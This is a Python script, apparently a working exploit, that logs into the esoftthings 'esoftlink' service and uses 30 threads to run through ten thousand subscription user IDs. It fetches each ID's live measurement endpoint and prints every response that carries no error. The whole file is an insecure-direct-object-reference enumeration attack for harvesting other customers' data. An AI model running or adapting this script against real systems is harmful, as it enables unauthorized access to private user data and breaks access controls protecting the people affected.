import requests
from concurrent.futures import ThreadPoolExecutor
import time
import threading

# ----------------------------
# CONFIG
# ----------------------------
USERNAME = "foobar@network.com"
PASSWORD = "passwd"
CNT_ID = "1234567890"

BASE_URL = "https://esoftlink.esoftthings.com"

THREADS = 30
RELOGIN_INTERVAL = 2 * 60 * 60  # 2 heures

# ----------------------------
# GLOBAL STATE
# ----------------------------
session = requests.Session()
PHPSESSID = None
lock = threading.Lock()

last_login_time = 0

# ----------------------------
# LOGIN FUNCTION
# ----------------------------
def login():
    global PHPSESSID, last_login_time, session

    print("[+] Re-login...")

    s = requests.Session()

    r = s.post(
        f"{BASE_URL}/login_check",
        data={
            "_username": USERNAME,
            "_password": PASSWORD
        },
        allow_redirects=False,
        timeout=10
    )

    cookies = s.cookies.get_dict()

    if "PHPSESSID" not in cookies:
        print("Login failed - no PHPSESSID")
        return False

    with lock:
        session = s
        PHPSESSID = cookies["PHPSESSID"]
        last_login_time = time.time()

    print(f"[+] PHPSESSID refreshed")

    return True

# ----------------------------
# CHECK LOGIN EXPIRATION
# ----------------------------
def ensure_login():
    global last_login_time

    if time.time() - last_login_time > RELOGIN_INTERVAL:
        login()

# ----------------------------
# WORKER
# ----------------------------

def check_user(user_id):
    ensure_login()

    user_raw = str(user_id)
    user_padded = str(user_id).zfill(6)

    seen = set()

    for user_str in (user_raw, user_padded):

        if user_str in seen:
            continue
        seen.add(user_str)

        url = f"{BASE_URL}/api/subscription/{user_str}/{CNT_ID}/measure/live.json"

        try:
            with lock:
                s = session

            r = s.get(url, timeout=5)

            if '"error"' not in r.text:
                print(f"\nUserId={user_str}")
                print(r.text)
                print("-" * 40)

        except requests.RequestException:
            pass

    time.sleep(0.01)


# ----------------------------
# START
# ----------------------------
if not login():
    exit(1)

print("[+] Scanning...")

with ThreadPoolExecutor(max_workers=THREADS) as executor:
    for user_id in range(490000, 500000):
        executor.submit(check_user, user_id)
